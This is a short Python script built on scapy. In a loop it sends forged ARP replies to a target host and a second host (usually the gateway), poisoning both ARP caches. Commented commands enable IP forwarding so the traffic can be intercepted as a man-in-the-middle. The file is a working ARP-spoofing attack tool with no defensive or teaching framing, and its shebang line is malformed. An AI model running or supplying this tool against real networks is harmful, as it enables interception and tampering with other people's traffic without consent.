#!/usr/bin/env_python
import subprocess
import time
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    package = broadcast / arp_request
    answered = srp(package, timeout=1)[0]
    print(answered)
    return answered[0][1].hwsrc


def spoofing(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    package = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(package)


target = input("Enter target IP-address: ")
spoof = input("Enter spoof IP-address: ")
# sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
while True:
    spoofing(target, spoof)
    spoofing(spoof, target)
    time.sleep(1)
